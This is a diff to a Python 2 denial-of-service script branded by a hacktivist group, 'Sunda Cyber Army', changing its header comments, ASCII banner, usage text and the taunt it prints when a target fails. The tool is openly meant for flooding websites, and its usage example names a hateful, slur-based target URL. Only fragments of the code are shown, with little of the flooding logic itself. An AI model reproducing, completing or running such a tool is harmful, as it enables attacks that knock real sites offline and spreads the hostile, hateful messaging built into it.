@@ -1,3 +1,8 @@
+# Sunda Cyber Army 
+# Protokol DDoS adalah tipe serangan paling masif
+# Youtube Link : https://www.youtube.com/channel/UCJl5SuxvQ6C0uX4uYNGLAxg/featured
+# Author : Mister_D
+# ------------------------------------------------------------------------------------------
 import urllib2
 import sys
 import threading
@@ -61,20 +66,20 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python dos.py url : http://www.israelfuck.com/'
-	print 'SundaCyberArmy Created by : MISTER_D'
+	print 'USAGE: python DOS.py url : http://www.israelfuck.com/'
+	print 'Sunda Cyber Army Created by : MISTER_D'
 	print "\a"
 print \
 """            _________
-              |   /$$$$$$$  /$$$$$$$  	         /$$$$$$      
-     -------|    | $$__  $$| $$__  $$           /$$__  $$    |-------
-            |    | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/    | 
-            |    | $$  | $$| $$  | $$ /$$__  $$|  $$$$$$     | 
-     -------|    | $$  | $$| $$  | $$| $$  \ $$ \____  $$    |------- 
-            |    | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$    | 
-            |    | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/    | 
-     -------|    |_______/ |_______/  \______/  \______/     |-------
-            |_____________________[MISTER_D]_________________________|
+              |   /$$$$$$$  	       /$$$$$$             
+     -------|    | $$__  $$           /$$__  $$    |-------
+            |    | $$  \ $$  /$$$$$$ | $$  \__/    | 
+            |    | $$  | $$ /$$__  $$|  $$$$$$     | 
+     -------|    | $$  | $$| $$  \ $$ \____  $$    |------- 
+            |    | $$  | $$| $$  | $$ /$$  \ $$    | 
+            |    | $$$$$$$/|  $$$$$$/|  $$$$$$/    |           |
+     -------|    |_______/  \______/  \______/     |-------    |
+            |_____________________[MISTER_D]___________________|
      	                             AND
                          SUNDA CYBER ARMY ALL MEMBER
 ______________________________________________________________________________
@@ -105,7 +110,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'MISTER_D AND SCA ATTACKERS YOUR SAFETY SYSTEM IS VERY WEAK :v '
+ 			print ' -=> SUNDA CYBER ARMY ATTACKERS YOUR SAFETY SYSTEM IS VERY WEAK <=- '
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
